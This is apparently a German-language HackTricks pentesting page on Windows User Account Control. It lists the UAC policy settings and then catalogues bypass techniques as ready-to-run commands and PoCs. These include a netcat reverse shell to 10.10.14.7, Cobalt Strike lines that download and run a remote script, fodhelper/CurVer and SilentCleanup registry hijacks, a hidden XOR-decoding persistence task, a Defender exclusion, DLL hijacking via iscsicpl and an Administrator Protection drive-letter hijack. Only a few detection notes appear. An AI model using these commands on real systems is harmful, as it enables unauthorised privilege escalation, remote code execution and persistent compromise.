# UAC - Benutzerkontensteuerung

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsabfrage für Aktionen mit erhöhten Rechten** ermöglicht. Anwendungen verfügen über unterschiedliche `integrity`-Stufen, und ein Programm mit einer **hohen Stufe** kann Aufgaben ausführen, die das **System potenziell gefährden könnten**. Wenn UAC aktiviert ist, **werden Anwendungen und Aufgaben immer im Sicherheitskontext eines Nicht-Administratorkontos ausgeführt**, es sei denn, ein Administrator autorisiert diese Anwendungen bzw. Aufgaben ausdrücklich, Administratorzugriff auf das System zu erhalten. Es handelt sich um eine Komfortfunktion, die Administratoren vor unbeabsichtigten Änderungen schützt, aber nicht als Sicherheitsgrenze betrachtet wird.<sup>[[2]](#references)</sup>

Weitere Informationen zu integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wenn UAC aktiv ist, erhält ein Administratorbenutzer 2 Tokens: ein Standardbenutzertoken zur Ausführung regulärer Aktionen mit mittlerer Integrität und eines mit Administratorrechten.

Diese [Seite](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) erläutert die Funktionsweise von UAC sehr ausführlich und umfasst den Anmeldevorgang, die Benutzererfahrung und die UAC-Architektur.<sup>[[2]](#references)</sup> Administratoren können Sicherheitsrichtlinien verwenden, um die Funktionsweise von UAC auf lokaler Ebene an ihre Organisation anzupassen (mit secpol.msc), oder sie in einer Active Directory-Domänenumgebung über Group Policy Objects (GPO) konfigurieren und verteilen. Die verschiedenen Einstellungen werden [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ausführlich erläutert. Für UAC können 10 Group Policy-Einstellungen festgelegt werden. Die folgende Tabelle enthält weitere Details:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Deaktiviert)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Zustimmungsabfrage für Nicht-Windows-Binärdateien auf dem sicheren Desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Abfrage von Anmeldedaten auf dem sicheren Desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Aktiviert; standardmäßig auf Enterprise deaktiviert)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Deaktiviert)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Aktiviert)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Aktiviert)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Deaktiviert)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Aktiviert)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Aktiviert)                                              |

### Richtlinien für die Installation von Software unter Windows

Die **lokalen Sicherheitsrichtlinien** ("secpol.msc" auf den meisten Systemen) sind standardmäßig so konfiguriert, dass sie **Nicht-Administratoren an der Installation von Software hindern**. Das bedeutet, dass ein Nicht-Administrator selbst dann, wenn er das Installationsprogramm für deine Software herunterladen kann, dieses nicht ohne ein Administratorkonto ausführen kann.

### Registry Keys, um UAC zur Abfrage einer Erhöhung zu zwingen

Als Standardbenutzer ohne Administratorrechte kannst du sicherstellen, dass das "Standardkonto" **von UAC zur Eingabe von Anmeldedaten aufgefordert wird**, wenn es versucht, bestimmte Aktionen auszuführen. Dafür müssen bestimmte **Registry Keys** geändert werden, wofür du Administratorrechte benötigst, sofern es keinen **UAC bypass** gibt oder der Angreifer bereits als Administrator angemeldet ist.

Selbst wenn sich der Benutzer in der Gruppe **Administrators** befindet, zwingen diese Änderungen den Benutzer dazu, **seine Kontodaten erneut einzugeben**, um administrative Aktionen auszuführen.

**In der Praxis ist dies erst nützlich, wenn du bereits über ein Token mit erhöhten Rechten, einen UAC bypass oder eine Fehlkonfiguration verfügst, die das Ändern dieser Keys ermöglicht; andernfalls wird der Registry-Schreibvorgang selbst blockiert.**

Die Registry Keys und Einträge, die du ändern musst, sind folgende (mit ihren Standardwerten in Klammern):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Dies kann auch manuell über das Tool für lokale Sicherheitsrichtlinien durchgeführt werden. Nach der Änderung wird der Benutzer bei administrativen Vorgängen aufgefordert, seine Anmeldedaten erneut einzugeben.

### Hinweis

**User Account Control ist keine Sicherheitsgrenze.** Daher können Standardbenutzer ihre Konten nicht verlassen und ohne einen local privilege escalation exploit Administratorrechte erlangen.

### Einen Benutzer um „vollen Computerzugriff“ bitten
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Der geschützte Modus von Internet Explorer verwendet Integritätsprüfungen, um zu verhindern, dass Prozesse mit hoher Integritätsstufe (wie Webbrowser) auf Daten mit niedriger Integritätsstufe (wie den Ordner für temporäre Internetdateien) zugreifen. Dies wird erreicht, indem der Browser mit einem Token mit niedriger Integritätsstufe ausgeführt wird. Wenn der Browser versucht, auf Daten zuzugreifen, die in der Zone mit niedriger Integritätsstufe gespeichert sind, überprüft das Betriebssystem die Integritätsstufe des Prozesses und gewährt den Zugriff entsprechend. Diese Funktion hilft dabei, Remote-Code-Execution-Angriffe daran zu hindern, auf sensible Daten im System zuzugreifen.
- Wenn sich ein Benutzer bei Windows anmeldet, erstellt das System ein Zugriffstoken, das eine Liste der Berechtigungen des Benutzers enthält. Berechtigungen sind als Kombination aus den Rechten und Fähigkeiten eines Benutzers definiert. Das Token enthält außerdem eine Liste der Anmeldedaten des Benutzers, die zur Authentifizierung des Benutzers am Computer und bei Ressourcen im Netzwerk verwendet werden.

### Autoadminlogon

Um Windows so zu konfigurieren, dass beim Start automatisch ein bestimmter Benutzer angemeldet wird, muss der **`AutoAdminLogon`-Registrierungsschlüssel** gesetzt werden. Dies ist für Kiosk-Umgebungen oder zu Testzwecken nützlich. Verwende dies nur auf sicheren Systemen, da das Passwort dadurch in der Registry offengelegt wird.

Setze die folgenden Schlüssel mithilfe des Registrierungs-Editors oder von `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = Benutzername
- `DefaultPassword` = Passwort

Um das normale Anmeldeverhalten wiederherzustellen, setze `AutoAdminLogon` auf 0.

## UAC bypass

> [!TIP]
> Beachte, dass UAC bypass bei grafischem Zugriff auf das Opfer unkompliziert ist, da du einfach auf „Ja“ klicken kannst, wenn die UAC-Eingabeaufforderung erscheint

UAC bypass wird in der folgenden Situation benötigt: **UAC ist aktiviert, dein Prozess läuft in einem Kontext mit mittlerer Integritätsstufe und dein Benutzer gehört zur Administratorengruppe.**

Es ist wichtig zu erwähnen, dass es **wesentlich schwieriger ist, UAC zu umgehen, wenn die höchste Sicherheitsstufe (Always) aktiviert ist, als bei jeder der anderen Stufen (Default).**

### Fast triage from a medium-integrity shell

Bevor du einen Bypass ausprobierst, bestätige, dass du dich in der richtigen Situation befindest, und ordne den Host-Build bekannten funktionierenden Methoden zu:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Praktische Hinweise:
- Wenn `EnableLUA=0` ist, benötigst du keinen Bypass: Jedes Admin-Token kann direkt eine hohe Integrität anfordern.
- `ConsentPromptBehaviorAdmin=2` oder `5` ist das häufige Szenario für auto-elevate- / COM-based Bypasses.
- `Always Notify` setzt die Hürde höher, aber du solltest trotzdem den exakten Build testen, anstatt von einem Fehlschlag auszugehen: UACME erfasst weiterhin einige mit `AlwaysNotify compatible` gekennzeichnete Methoden auf modernen Windows-Builds.<sup>[[3]](#references)</sup>

### UAC deaktiviert

Wenn UAC bereits deaktiviert ist (`ConsentPromptBehaviorAdmin` ist **`0`**), kannst du eine **reverse shell mit Admin-Rechten** (hohe Integritätsstufe) beispielsweise folgendermaßen ausführen:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Sehr** grundlegender UAC-"bypass" (vollständiger Dateisystemzugriff)

Wenn du eine shell mit einem Benutzer hast, der Mitglied der Gruppe Administrators ist, kannst du die über SMB (Dateisystem) freigegebene **C$**-Freigabe lokal als neues Laufwerk einbinden und erhältst **Zugriff auf alles innerhalb des Dateisystems** (sogar auf den Home-Ordner des Administrators).

> [!WARNING]
> **Dieser Trick scheint nicht mehr zu funktionieren**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass mit Cobalt Strike

Die Cobalt-Strike-Techniken funktionieren nur, wenn UAC nicht auf die höchste Sicherheitsstufe eingestellt ist
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** und **Metasploit** verfügen ebenfalls über mehrere Module zum **Bypass** der **UAC**.

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM objects bleiben auch auf aktuellen Builds eine praktische UAC-Angriffsfläche. `ICMLuaUtil` wird von UACME weiterhin als funktionsfähig auf aktuellen Windows-Branches geführt, und offensive Tools passen `CMSTPLUA` laufend an, indem sie einen interaktiven Desktop-Prozess, 64-Bit-Ausführung und manchmal PEB-/Prozess-Masquerading kombinieren, bevor sie den COM Elevation Moniker aufrufen.<sup>[[3]](#references)</sup>

Praktische Tipps:
- Bevorzugt einen **64-bit**-Prozess in der **interaktiven Session** des Benutzers (üblicherweise `explorer.exe` oder einen untergeordneten Prozess davon).
- Wenn eine rohe Shell fehlschlägt, versucht es erneut über eine BOF-/UACME-Implementierung statt über einen naiven `CreateProcess`-Wrapper.
- Rechnet damit, dass die Child-Ausführung in einem **separaten elevated process** erfolgt; viele BOFs elevaten den aktuellen Beacon nicht direkt.

### KRBUACBypass

Dokumentation und Tool unter [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME), eine **Zusammenstellung** mehrerer UAC bypass exploits. Beachtet, dass ihr **UACME mit Visual Studio oder msbuild kompilieren** müsst. Die Kompilierung erstellt mehrere Executables (wie `Source\Akagi\outout\x64\Debug\Akagi.exe`); ihr müsst wissen, **welches davon ihr benötigt.**<sup>[[3]](#references)</sup>\
Seid **vorsichtig**, da einige Bypasses **andere Programme dazu veranlassen**, Eingabeaufforderungen anzuzeigen, die den **Benutzer** **warnen**, dass gerade etwas geschieht.<sup>[[3]](#references)</sup>

UACME enthält die **Build-Version, ab der jede Technik funktionierte**.<sup>[[3]](#references)</sup> Ihr könnt nach einer Technik suchen, die eure Versionen betrifft:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Außerdem erhältst du mithilfe [dieser](https://en.wikipedia.org/wiki/Windows_10_version_history) Seite das Windows-Release `1607` aus den Build-Versionen.

Ein praktischer Workflow besteht darin, zunächst den **Host-Build zu bewerten** und erst danach die passende Methode auszuführen:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` vergleicht den lokalen Build schnell mit seinen bekannten UAC-Methoden, was nützlich ist, um veraltete PoCs schnell auszusortieren.<sup>[[4]](#references)</sup>
- `UACME` bleibt der beste öffentliche Katalog, um einen Bypass einem präzisen Build zuzuordnen. Neuere Releases haben neue Methoden hinzugefügt und bestehende Methoden erneut gegen **Windows 11 25H2** getestet. Prüfe daher die README und Release Notes erneut, bevor du annimmst, dass ein älterer Blogbeitrag unverändert noch relevant ist.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Die vertrauenswürdige Binärdatei `fodhelper.exe` wird unter modernen Windows-Versionen automatisch mit erhöhten Rechten ausgeführt. Beim Start fragt sie den unten aufgeführten benutzerspezifischen Registry-Pfad ab, ohne das Verb `DelegateExecute` zu validieren. Durch das Hinterlegen eines Befehls dort kann ein Prozess mit mittlerer Integrität (der Benutzer ist Mitglied der Gruppe Administrators) einen Prozess mit hoher Integrität ohne UAC-Eingabeaufforderung starten.

Vom fodhelper abgefragter Registry-Pfad:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell-Schritte (Payload festlegen, dann auslösen)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Hinweise:
- Funktioniert, wenn der aktuelle Benutzer Mitglied der Administrators ist und die UAC-Ebene auf default/lenient eingestellt ist (nicht auf Always Notify mit zusätzlichen Einschränkungen).
- Verwende den `sysnative`-Pfad, um eine 64-Bit-PowerShell aus einem 32-Bit-Prozess unter 64-Bit-Windows zu starten.
- Payload kann jeder Befehl sein (PowerShell, cmd oder ein EXE-Pfad). Vermeide für mehr Stealth UIs, die eine Eingabeaufforderung anzeigen.

#### CurVer/extension hijack variant (nur HKCU)

Aktuelle Samples, die `fodhelper.exe` missbrauchen, vermeiden `DelegateExecute` und leiten stattdessen die `ms-settings` ProgID über den benutzerspezifischen `CurVer`-Wert um. Die auto-elevated Binary löst den Handler weiterhin unter `HKCU` auf, sodass kein Admin-Token erforderlich ist, um die Keys zu platzieren:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Nach der Privilegienerweiterung **deaktiviert** Malware häufig **künftige Eingabeaufforderungen**, indem sie `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` auf `0` setzt. Anschließend führt sie zusätzliche Defense Evasion durch (z. B. `Add-MpPreference -ExclusionPath C:\ProgramData`) und stellt die persistence wieder her, um mit high integrity ausgeführt zu werden. Eine typische persistence-Aufgabe speichert ein **XOR-verschlüsseltes PowerShell-Skript** auf der Festplatte und decodiert bzw. führt es jede Stunde im Arbeitsspeicher aus:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Diese Variante bereinigt weiterhin den **Dropper** und lässt nur die gestagten Payloads zurück. Dadurch hängt die Erkennung von der Überwachung des **`CurVer`-Hijacks**, der Manipulation von `ConsentPromptBehaviorAdmin`, der Erstellung von Defender-Ausschlüssen oder geplanten Tasks ab, die PowerShell im Speicher entschlüsseln.<sup>[[5]](#references)</sup>

### UAC-Bypass über den Task `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` startet `cleanmgr.exe` mit höchsten Privilegien und expandiert `%windir%` aus der Benutzerumgebung. Wenn du `HKCU\Environment\windir` kontrollierst, kannst du diese Expansion auf einen beliebigen Befehl umleiten und ohne Zustimmungsdialog eine hohe Integrität erlangen.<sup>[[8]](#references)</sup> Diese Methode ist auf aktuellen Builds weiterhin einen Test wert, da UACME die Technik aktiv hält und die Nachverfolgung aktueller Issues zeigt, dass Windows 11 24H2 möglicherweise nur geringfügige Anpassungen der Anführungszeichen erfordert.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Wenn die Aufgabe den Pfad bei diesem Build in Anführungszeichen setzt, wiederhole den Vorgang mit einem Payload, der mit einem Anführungszeichen endet (zum Beispiel `cmd.exe"`). Bereinige `HKCU\Environment\windir` nach dem Test immer.

#### Weitere UAC bypasses

Viele klassische UAC bypasses, die UI-Abläufe, COM-Objekte oder Desktop-Interaktion ausnutzen, erfordern eine **vollständige interaktive Sitzung** mit dem Opfer; eine gewöhnliche `nc.exe`-Shell oder ein in **Session 0** ausgeführter Dienst reicht oft nicht aus.

Das lässt sich häufig mit einer **meterpreter**-Sitzung lösen. Migriere zu einem **process**, dessen **Session**-Wert **1** entspricht:

![ms-settings auf eine benutzerdefinierte Erweiterung (.thm) verweisen und diese Erweiterung unserem Payload zuordnen – Weitere UAC bypasses: Dies ist über eine meterpreter-Sitzung möglich. Migriere zu einem process, dessen Session...](<../../images/image (863).png>)

(_explorer.exe_ sollte funktionieren)

### UAC Bypass mit GUI

Wenn du Zugriff auf eine **GUI** hast, kannst du die UAC-Eingabeaufforderung einfach **bestätigen**, sobald sie erscheint; du benötigst also keinen technischen bypass. Daher reicht eine GUI-Sitzung oft aus, um die praktische Einschränkung durch UAC zu umgehen.

Wenn du außerdem eine GUI-Sitzung erhältst, die jemand verwendet hat (möglicherweise über RDP), werden dort möglicherweise **einige Tools als administrator ausgeführt**, über die du beispielsweise direkt ein **cmd** **als admin** **ausführen** kannst, ohne erneut von UAC aufgefordert zu werden, wie bei [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dies könnte etwas **stealthy** sein.

### Lauter Brute-Force-UAC-bypass

Wenn dir die Lautstärke deines Vorgehens egal ist, kannst du jederzeit **etwas wie** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) **ausführen**, das so lange nach erweiterten Berechtigungen **fragt, bis der Benutzer dies akzeptiert**.

### Dein eigener bypass – grundlegende UAC-bypass-Methodik

Wenn du dir **UACME** ansiehst, wirst du feststellen, dass **viele UAC bypasses DLL hijacking ausnutzen** (häufig, indem eine erhöhte Binary eine vom Angreifer kontrollierte DLL aus einem beschreibbaren Pfad lädt). [Lies dies, um zu erfahren, wie du eine DLL-hijacking-Schwachstelle findest](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Finde eine Binary, die **autoelevate** ausführt (prüfe, ob sie beim Ausführen mit einem hohen Integrity Level läuft).
2. Suche mit ProcMon nach Ereignissen mit "**NAME NOT FOUND**", die für **DLL Hijacking** anfällig sein könnten.
3. Wahrscheinlich musst du die DLL in einige **geschützte Pfade** schreiben (wie `C:\Windows\System32`), für die du keine Schreibberechtigungen hast. Dies kannst du umgehen mit:
1. **wusa.exe**: Windows 7, 8 und 8.1. Damit kann der Inhalt einer CAB-Datei in geschützte Pfade extrahiert werden (da dieses Tool mit einem hohen Integrity Level ausgeführt wird).
2. **IFileOperation**: Windows 10.
4. Bereite ein **Skript** vor, das deine DLL in den geschützten Pfad kopiert und die anfällige und autoelevated Binary ausführt.

### Eine weitere UAC-bypass-Technik

Dabei wird beobachtet, ob eine **autoElevated Binary** versucht, aus der **registry** den **Namen/Pfad** einer **Binary** oder eines **Befehls** zu **lesen**, der **ausgeführt** werden soll (dies ist besonders interessant, wenn die Binary diese Informationen in **HKCU** sucht).

### UAC bypass über `SysWOW64\iscsicpl.exe` + DLL hijacking über den Benutzer-`PATH`

Die 32-Bit-Datei `C:\Windows\SysWOW64\iscsicpl.exe` ist eine **auto-elevated** Binary, die durch die Suchreihenfolge dazu gebracht werden kann, `iscsiexe.dll` zu laden. Wenn du eine schädliche `iscsiexe.dll` in einem **vom Benutzer beschreibbaren** Ordner platzieren und anschließend den `PATH` des aktuellen Benutzers ändern kannst (zum Beispiel über `HKCU\Environment\Path`), sodass dieser Ordner durchsucht wird, lädt Windows möglicherweise die Angreifer-DLL in den Prozess der erhöht ausgeführten `iscsicpl.exe`, **ohne eine UAC-Eingabeaufforderung anzuzeigen**.<sup>[[1]](#references)[[6]](#references)</sup>

Praktische Hinweise:
- Dies ist nützlich, wenn der aktuelle Benutzer Mitglied der Gruppe **Administrators** ist, aber aufgrund von UAC mit **Medium Integrity** ausgeführt wird.
- Die Kopie unter **SysWOW64** ist für diesen bypass relevant. Behandle die Kopie unter **System32** als separate Binary und überprüfe ihr Verhalten unabhängig.
- Das Primitive ist eine Kombination aus **auto-elevation** und **DLL search-order hijacking**. Daher ist derselbe ProcMon-Workflow wie bei anderen UAC bypasses nützlich, um den fehlenden DLL-Ladevorgang zu validieren.

Minimaler Ablauf:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Erkennungsideen:
- Auf `reg add` / registry writes nach `HKCU\Environment\Path` alarmieren, wenn unmittelbar danach `C:\Windows\SysWOW64\iscsicpl.exe` ausgeführt wird.
- Nach `iscsiexe.dll` an **vom Benutzer kontrollierten** Speicherorten wie `%TEMP%` oder `%LOCALAPPDATA%\Microsoft\WindowsApps` suchen.
- Starts von `iscsicpl.exe` mit unerwarteten Child-Prozessen oder DLL loads außerhalb der normalen Windows-Verzeichnisse korrelieren.

### Neuere, separat zu prüfende Forschung

Einige Chains nach 2024 sehen nicht mehr wie die klassischen `HKCU\Software\Classes`-Registry-Hijacks aus. Beispielsweise kann activation-context cache poisoning einen **drive remap** und **DLL redirection** kombinieren, um über vertrauenswürdige UI- / auto-elevated binaries wie `ctfmon.exe` und spätere Ziele wie `fodhelper.exe` von mittlerer zu hoher Integrität zu gelangen. Statt den umfangreichen PoC hier zu duplizieren, siehe die kompakten payload examples unter:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2) drive-letter hijack über per-logon-session DOS device map

Für die vollständige Angriffsfläche von `RAiLaunchAdminProcess` / UIAccess unter Windows 11 25H2 siehe die dedizierte Seite:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 „Administrator Protection“ verwendet shadow-admin tokens mit sitzungsbezogenen `\Sessions\0\DosDevices/<LUID>`-Maps. Das Verzeichnis wird von `SeGetTokenDeviceMap` bei der ersten `\??`-Auflösung verzögert erstellt. Wenn der Angreifer den shadow-admin token nur auf **SecurityIdentification** impersoniert, wird das Verzeichnis mit dem Angreifer als **owner** erstellt (es erbt `CREATOR OWNER`), wodurch drive-letter links Vorrang vor `\GLOBAL??` erhalten.<sup>[[7]](#references)</sup>

**Schritte:**

1. Rufe aus einer Sitzung mit niedrigen Berechtigungen `RAiProcessRunOnce` auf, um ein promptless shadow-admin-`runonce.exe` zu starten.
2. Dupliziere dessen primary token als **identification** token und impersoniere ihn, während du `\??` öffnest, um die Erstellung von `\Sessions\0\DosDevices/<LUID>` unter der Kontrolle des Angreifers zu erzwingen.
3. Erstelle dort einen `C:`-Symlink, der auf vom Angreifer kontrollierten Speicher verweist. Nachfolgende filesystem accesses in dieser Sitzung lösen `C:` zum Pfad des Angreifers auf und ermöglichen einen DLL/file hijack ohne prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Quellen

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
